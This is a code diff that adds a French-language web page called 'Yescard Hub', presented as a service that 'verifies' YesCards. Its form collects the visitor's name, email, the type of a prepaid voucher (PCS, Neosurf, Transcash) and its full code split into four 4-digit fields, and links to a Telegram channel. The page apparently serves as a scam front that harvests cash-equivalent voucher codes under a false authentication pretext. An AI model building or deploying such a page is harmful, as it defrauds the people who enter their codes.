@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="fr-FR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://www.yescardhub.com/">
+    <meta property="og:title" content="Yescard Hub — Vérification des YesCards">
+    <meta property="og:description" content="Nous sommes une référence dans l'authentification des Yescards.">
+    <meta property="og:image" content="https://www.yescardhub.github.io/w/public/img/pic (1).jpg">
+    <meta property="og:locale" content="fr_FR">
+
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://www.yescardhub.com/">
+    <meta property="twitter:title" content="Yescard Hub — Vérification des YesCards">
+    <meta property="twitter:description" content="Nous sommes une référence dans l'authentification des Yescards.">
+    <meta property="twitter:image" content="https://www.yescardhub.com/public/img/preview.jpg">
+
+    <link rel="shortcut icon" href="public/img/icon.png" type="image/x-icon">
+    <link rel="stylesheet" href="public/css/main.css">
+    <link rel="stylesheet" href="public/css/animate.css">
+    <link rel="stylesheet" href="public/css/tailwind.css">
+
+    <link href="https://fonts.googleapis.com/css2?family=Faculty+Glyphic:wght@400" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Questrial&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/gsap.min.js"></script>
+    <script src="https://unpkg.com/scrollreveal"></script>
+
+    <title>Yescard Hub — Vérification des YesCards</title>
+</head>
+
+<body>
+    <section class="bg-white relative flex flex-wrap lg:h-screen lg:items-center form">
+        <div class="w-full px-4 py-12 sm:px-6 sm:py-16 lg:w-1/2 lg:px-8 lg:py-24">
+            <div class="mx-auto max-w-lg text-center">
+                <h1 class="text-3xl sm:text-4xl text-black font-extrabold"
+                    style="line-height:1.1;font-family:Faculty Glyphic">
+                    Vérification avec Yescard Hub
+                </h1>
+                <p class="mt-4 text-gray-600">
+                    Nous sommes une référence dans l'authentification des Yescards
+                </p>
+            </div>
+            <form action="" method="POST" class="mx-auto mb-0 mt-8 max-w-md space-y-4">
+                <div class="flex flex-wrap gap-2 items-center align-middle">
+                    <div class="w-full">
+                        <label for="name" class="sr-only">Nom</label>
+                        <div class="relative">
+                            <input type="text" name="Nom du client"
+                                class="w-full rounded-lg outline-none text-gray-900 text-1xl border border-gray-400 bg-gray-50 p-4 pe-12"
+                                placeholder="Nom complet" required />
+                        </div>
+                    </div>
+                </div>
+                <div class="flex flex-wrap gap-2 items-center align-middle">
+                    <div class="w-full">
+                        <label for="email" class="sr-only">Email</label>
+                        <div class="relative">
+                            <input type="email" name="email"
+                                class="w-full rounded-lg outline-none text-gray-900 text-1xl border border-gray-400 bg-gray-50 p-4 pe-12"
+                                placeholder="e-mail" required />
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flex flex-wrap gap-2 items-center align-middle">
+                    <div class="w-full">
+                        <label for="Type de recharge" class="sr-only">Type de recharge</label>
+                        <div class="relative">
+                            <select name="Type de recharge"
+                                class="w-full rounded-lg outline-none text-gray-900 text-1xl border border-gray-400 bg-gray-50 p-4 pe-12"
+                                required>
+                                <option value="" disabled selected>Sélectionner un type de recharge</option>
+                                <option value="pcs">PCS</option>
+                                <option value="neosurf">NEOSURF</option>
+                                <option value="transcash">TRANSCASH</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flex justify-between gap-2">
+                    <div class="w-1/4">
+                        <label for="code1" class="sr-only">Code 1</label>
+                        <input type="text" name="code1"
+                            class="w-full border border-gray-400 rounded-lg outline-none text-gray-900 text-1xl bg-gray-50 p-4 pe-12 text-center"
+                            placeholder="Code 1" maxlength="4" pattern="\d{4}" required />
+                    </div>
+                    <div class="w-1/4">
+                        <label for="code2" class="sr-only">Code 2</label>
+                        <input type="text" name="code2"
+                            class="w-full border border-gray-400 rounded-lg outline-none text-gray-900 text-1xl bg-gray-50 p-4 pe-12 text-center"
+                            placeholder="Code 2" maxlength="4" pattern="\d{4}" required />
+                    </div>
+                    <div class="w-1/4">
+                        <label for="code3" class="sr-only">Code 3</label>
+                        <input type="text" name="code3"
+                            class="w-full border border-gray-400 rounded-lg outline-none text-gray-900 text-1xl bg-gray-50 p-4 pe-12 text-center"
+                            placeholder="Code 3" maxlength="4" pattern="\d{4}" required />
+                    </div>
+                    <div class="w-1/4">
+                        <label for="code4" class="sr-only">Code 4</label>
+                        <input type="text" name="code4"
+                            class="w-full border border-gray-400 rounded-lg outline-none text-gray-900 text-1xl bg-gray-50 p-4 pe-12 text-center"
+                            placeholder="Code 4" maxlength="4" pattern="\d{4}" required />
+                    </div>
+                </div>
+
+                <div class="flex flex-wrap items-center gap-2 justify-center">
+                    <button type="submit"
+                        class="w-full hover:border hover:border-black rounded-full hover:bg-black hover:bg-black px-5 py-3 text-1xl text-white font-medium hover:text-white"
+                        style="background-color: var(--main-color);">
+                        Vérifier
+                    </button>
+                    <p class="text-1xl text-gray-900 text-center mt-4">
+                        Vous voulez rejoindre notre canal Telegram?
+                        <a class="underline" href="" style="color:var(--main-color);">Ouvrir Telegram</a>
+                    </p>
+                </div>
+            </form>
+        </div>
+
+        <div class="relative h-64 w-full sm:h-96 lg:h-full lg:w-1/2 bg-cover" id="cover"
+            style="background-image:url('public/img/pic\ \(1\).jpg');background-size:cover"></div>
+    </section>
+</body>
+</html>
